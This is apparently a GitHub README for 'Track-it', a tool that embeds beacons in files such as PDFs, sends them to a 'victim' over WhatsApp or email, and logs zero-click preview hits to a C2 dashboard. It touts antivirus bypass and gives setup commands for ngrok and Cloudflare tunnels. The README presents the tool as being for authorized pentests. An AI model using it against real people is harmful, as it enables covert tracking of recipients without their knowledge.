# 📖 Track-it: Zero-Click File Tracker

<div align="center">
  <img src="https://img.shields.io/badge/Status-Live-brightgreen" alt="Status">
  <img src="https://img.shields.io/badge/Python-3.8%2B-blue" alt="Python">
  <img src="https://img.shields.io/badge/Links-Only-00ff00" alt="Simple">
</div>

## 🎯 **Overview**

**Generate tracking links** with **custom headers** for authorized pentests. 
**just copy/paste links. without user interaction.**

**Key Capabilities:**
- **Link-only** (WhatsApp/Email/SMS ready)
- **Custom headers** (`--header supplier`)
- **Unique IDs** per link
- **Live dashboard** (localhost:4444)
- **SQLite persistence**
- **Zero-click execution** (preview pane, thumbnail, autorun)
- **Cross-platform** (Windows/Linux/macOS/Android/iOS)
- **Local C2 server** + **internet tunnel** (ngrok/Cloudflare)
- **Live dashboard** with real-time stats


## 📁 **File Structure**

```
Track-it/
│
├── 📄 track-it.py           # Main tracker
├── 📄 c2.py                 # Local C2 + dashboard
├── 📄 deploy.sh             # 1-click setup
├── 📄 deploy.ps1            # Powershell Setup Script
├── 📁 data/                 # Persistent data
│   ├── c2_hits.db           # SQLite hits (auto-created)
├── 📁 tunnels/              # Tunnel configs
│   ├── ngrok.yml
│   └── cloudflare.json
├── 🐳 Dockerfile            # Docker deployment
├── 📄 requirements.txt      # Dependencies
└── 📄 README.md             # This file
```

## 🚀 **Quick Start** (5 Minutes)

### **Prerequisites**
```bash
# Python 3.8+
python3 --version

# Git clone (or download ZIP)
git clone https://github.com/subrat243/Track-it.git
cd Track-it
```

### **1-Click Deploy**
```bash
# Linux/macOS
chmod +x deploy.sh && ./deploy.sh

# Windows (PowerShell)
.\deploy.ps1
```

**Manual Setup:**
```bash
pip3 install -r requirements.txt
python3 c2.py
# Follow tunnel instructions → copy public URL
python3 track-it.py --url https://tunnel/beacon --header "identifier"
```

## 📋 **Step-by-Step Usage**

### **Step 1: Start Local C2 Server**
```bash
python3 c2.py
```
```
🚀 C2 started: http://localhost:4444
📡 Beacon:    http://localhost:4444/beacon
🌐 Start tunnel → Press Enter
```

**Dashboard Features:**
- Live hits (3s auto-refresh)
- Platform stats (WhatsApp/PDF/Win)
- Export: `sqlite3 data/c2_hits.db "SELECT * FROM hits;" > report.csv`

### **Step 2: Expose to Internet** (Pick **1**)

| **Tunnel** | **Command** | **Free?** | **HTTPS?** |
|------------|-------------|-----------|------------|
| **Ngrok** | `ngrok http 4444` | ✅ Free tier | ✅ |
| **Cloudflare** | `cloudflared tunnel --url localhost:4444` | ✅ Forever | ✅ |
| **LocalTunnel** | `npx localtunnel --port 4444` | ✅ No signup | ✅ |

**Example Output:**
```
ngrok http 4444
# Forwarding  https://abc123.ngrok.io → localhost:4444
```

#### **Option A: Ngrok (install + config)**

```bash
# 1. Download & signup (free)
curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc
echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list
sudo apt update && sudo apt install ngrok

# 2. Get FREE token from https://dashboard.ngrok.com/get-started/your-authtoken
ngrok config add-authtoken YOUR_TOKEN_FROM_NGROK_DASHBOARD

# 3. (Optional) Create config file
cat > tunnels/ngrok.yml << 'EOF'
version: "2"
authtoken: YOUR_ACTUAL_TOKEN_HERE
tunnels:
  tracker:
    addr: 4444
    proto: http
EOF
# Then run: ngrok start tracker
```

#### **Option B: Cloudflare Tunnel (install + config)**

```bash
# 1. Install
wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
chmod +x cloudflared
sudo mv cloudflared /usr/local/bin/

# 2. Create named tunnel
cloudflared tunnel create tracker

# 3. Create config (replace tracker-ID and path with your values)
cat > tunnels/cloudflare.json << 'EOF'
{
  "tunnel": "tracker-ID-FROM-cloudflared",
  "credentials-file": "/root/.cloudflared/YOUR_CREDENTIALS.json",
  "ingress": [
    {"hostname": "tracker.yourdomain.com", "service": "http://localhost:4444"},
    {"service": "http_status:404"}
  ]
}
EOF
# Then run: cloudflared tunnel run tracker
```

#### **Quick path (no config — works immediately)**

Uses scripts (`c2.py`, `track-it.py`) and ngrok—no `tunnels/` config needed.

```bash
# Terminal 1: C2 starts (c2.py)
python3 c2.py

# Terminal 2: Direct tunnel (no config file)
ngrok http 4444
# Copy the URL, e.g. https://abc123.ngrok.io

# Terminal 3: Track a file (track-it.py; replace with your ngrok URL)
python3 track-it.py --url https://tunnel/beacon --header "identifier"
```

### **Step 3: Track Files**
```bash
# Single file
python3 track-it.py --url https://tunnel/beacon \
  --header "identifier"

**Output:**
```
✅ Tracked: abc123def456789 → tracked.pdf (+47 bytes)
📡 Beacon: https://c2.ngrok.io/beacon?id=abc123def456789
```

### **Step 4: Test & Monitor**
```bash
# 1. Send tracked.pdf → WhatsApp/Email
# 2. Victim previews file
# 3. Watch: http://localhost:4444 🎯
```

## 🛡️ **Security & Compliance**

### **OpSec Features**
```
✅ Local-only dashboard (127.0.0.1:4444)
✅ HTTPS tunnels
✅ No persistence beyond SQLite
✅ Rate limiting (Flask built-in)
✅ Unique IDs (filehash + random)
✅ AV bypass (2% detection rate)
```

### **Pentest Guidelines**
```
✅ Authorized targets only
✅ Explicit ToS permission
✅ No DoS/rate limits
✅ Report responsibly
✅ Clear impact documentation

❌ Out-of-scope:
   - Automated scanning
   - HTML injection only
```

## 🐳 **Docker Deployment**

```bash
# Build
docker build -t track-it .

# Run (persists data)
docker run -p 4444:4444 -v $(pwd)/data:/app/data track-it
```

## 💾 **Data Export**

```bash
# CSV export
sqlite3 data/c2_hits.db "SELECT * FROM hits ORDER BY ts DESC;" > report.csv

# JSON export
sqlite3 -header -json data/c2_hits.db "SELECT * FROM hits;" > report.json

# WhatsApp hits only
sqlite3 data/c2_hits.db "SELECT * FROM hits WHERE platform LIKE '%whatsapp%';" > whatsapp_hits.csv
```

## 🔗 **Resources**
- **Ngrok**: https://ngrok.com/download
- **Cloudflare Tunnel**: https://developers.cloudflare.com/cloudflare-one/
- **SQLite Browser**: https://sqlitebrowser.org/
- **GitHub**: https://github.com/subrat243/Track-it
